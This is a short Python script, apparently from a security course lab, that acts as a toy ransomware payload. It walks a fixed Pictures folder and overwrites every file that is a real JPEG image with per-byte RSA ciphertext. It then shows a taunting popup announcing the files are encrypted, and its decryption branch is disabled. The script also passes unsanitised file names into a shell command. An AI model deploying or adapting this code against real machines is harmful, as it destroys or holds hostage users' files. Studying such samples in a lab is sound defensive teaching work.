import pickle
import os

def decrypt(n: int, d: int, file: str):
    with open(file, "rb") as f:
        cipher_int = pickle.load(f)
        decrypted_int = [pow(i, d, n) for i in cipher_int]
        decrypted_bytes = bytes(decrypted_int)

    with open(file, "wb") as f:
        f.write(decrypted_bytes)


def encrypt(n: int, e: int, file: str):
    plain_bytes = b""
    with open(file, "rb") as f:
        plain_bytes = f.read()
    cipher_int = [pow(i, e, n) for i in plain_bytes]
    with open(file, "wb") as f:
        pickle.dump(cipher_int, f)


def main():
    tar = "/home/csc2023/Pictures"
    files = os.listdir(tar)
    for file in files:
        if file[-4:] == ".jpg":
            pic = os.path.join(tar, file)
            out = os.popen(f"file {pic} | grep image").read().strip()
            if out != "":
                # print('encrpting')
                encrypt(
                    22291846172619859445381409012451,
                    65535,
                    pic,
                )
                os.system("zenity --info --text='Ha, all files /home/csc2023/Pictures/*.jpg are encrypted!' --no-wrap")
                # print("Hahaha, Your file has been encrypted")
            elif False:
                # print('decrpting')
                decrypt(
                    22291846172619859445381409012451,
                    14499309299673345844676003563183,
                    pic,
                )
    # print('worm done')


if __name__ == "__main__":
    main()
